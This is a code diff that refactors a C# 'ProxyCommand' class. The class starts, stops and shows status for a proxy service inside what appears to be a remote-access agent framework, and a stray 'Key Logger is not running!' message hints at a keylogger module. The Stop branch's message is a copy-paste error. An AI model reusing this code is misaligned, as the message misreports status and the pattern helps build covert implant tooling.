@@ -3,56 +3,45 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using System.Windows.Forms;
-using System.Windows.Input;
-using System.Runtime.InteropServices;
-using System.IO;
-using System.Threading;
-using Agent.Models;
-using System.Diagnostics;
-using System.Net.Sockets;
-using System.Net.NetworkInformation;
-using Agent.Helpers;
 using Agent.Service;
-using Agent.Commands.Services;
+using Shared;
 
-namespace Agent.Commands
+namespace Agent.Commands.Services
 {
-    public class ProxyCommand : ServiceCommand<IProxyService>
+    internal class ProxyCommand : RunningServiceCommand<IProxyService>
     {
-        public override string Name => "proxy";
+        public override CommandId Command => CommandId.Proxy;
 
-
-        protected override void Start(AgentTask task, AgentCommandContext context, string[] args)
+        protected override async Task Start(AgentTask task, AgentCommandContext context)
         {
             if (this.Service.Status == RunningService.RunningStatus.Running)
             {
-                context.Result.Result = "Proxy is already running!";
+                context.AppendResult("Proxy is already running!");
                 return;
             }
 
             this.Service.Start();
-            context.Result.Result = $"Proxy started";
+            context.AppendResult($"Proxy started");
         }
 
-        protected override void Stop(AgentTask task, AgentCommandContext context, string[] args)
+        protected override async Task Stop(AgentTask task, AgentCommandContext context)
         {
             if (this.Service.Status != RunningService.RunningStatus.Running)
             {
-                context.Result.Result = "Proxy is not running!";
+                context.AppendResult("Key Logger is not running!");
                 return;
             }
 
             this.Service.Stop();
-            context.Result.Result = $"Proxy stopped";
+            context.AppendResult("Proxy stopped" + Environment.NewLine);
         }
 
-        protected override void Show(AgentTask task, AgentCommandContext context, string[] args)
+        protected override async Task Show(AgentTask task, AgentCommandContext context)
         {
             if (this.Service.Status == RunningService.RunningStatus.Running)
-                context.Result.Result = "Proxy is running!";
+                context.AppendResult("Proxy is running!");
             else
-                context.Result.Result = "Proxy is stopped!";
+                context.AppendResult("Proxy is stopped!");
             return;
         }
     }
